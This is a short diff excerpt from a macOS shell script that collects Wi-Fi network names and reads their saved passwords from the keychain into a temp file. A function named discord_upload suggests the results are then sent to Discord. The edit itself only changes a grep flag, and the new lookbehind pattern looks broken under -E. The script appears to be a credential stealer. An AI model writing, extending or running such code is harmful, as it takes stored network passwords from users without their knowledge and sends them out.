@@ -17,8 +17,8 @@ function discord_upload() {
 echo "Script started"
 echo "Gathering Wi-Fi profiles..." > "$temp_file"
 IFS=$'\n'
-for ssid in $(networksetup -listallhardwareports | grep -A 1 "Wi-Fi" | grep -oP '(?<=Device: ).*'); do
-  for network in $(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s -x | grep -oP '(?<=<string>).*?(?=</string>)'); do
+for ssid in $(networksetup -listallhardwareports | grep -A 1 "Wi-Fi" | grep -oE '(?<=Device: ).*'); do
+  for network in $(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s -x | grep -oE '(?<=<string>).*?(?=</string>)'); do
     security find-generic-password -D "AirPort network password" -a $network -w &> /dev/null
     if [ $? -eq 0 ]; then
       echo "SSID: $network" >> "$temp_file"
